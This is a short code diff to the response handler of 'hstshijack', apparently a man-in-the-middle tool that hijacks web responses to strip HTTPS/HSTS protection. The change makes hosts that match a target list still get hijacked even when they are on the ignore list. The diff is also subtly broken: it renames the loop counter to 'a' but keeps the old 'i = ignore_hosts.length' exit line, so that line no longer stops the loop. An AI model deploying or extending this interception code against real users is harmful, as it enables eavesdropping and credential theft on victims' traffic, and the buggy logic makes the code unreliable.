@@ -252,16 +252,22 @@ function onResponse(req, res) {
 			env("hstshijack.log") ? log_debug("(" + green + "hstshijack" + reset + ") Saved " + host + " to SSL log.") : ""
 		}
 	}
-	// Hijack this response if required
+	// Ignore this response if required
 	var ignored  = false
-	for (var i = 0; i < ignore_hosts.length; i++) {
-		regexp = wildcardToRegexp(ignore_hosts[i])
+	for (var a = 0; a < ignore_hosts.length; a++) {
+		regexp = wildcardToRegexp(ignore_hosts[a])
 		if ( req.Hostname.match(regexp) ) {
-			ignored = true
+			for (var b = 0; b < target_hosts.length; b++) {
+				regexp = wildcardToRegexp(target_hosts[b])
+				if ( !req.Hostname.match(regexp) ) {
+					ignored = true
+				}
+			}
 			i = ignore_hosts.length
 			log_debug("(" + green + "hstshijack" + reset + ") Ignored response from " + req.Hostname + ".")
 		}
 	}
+	// Hijack this response if required
 	if (!ignored) {
 		res.ReadBody()
 		// Strip location header
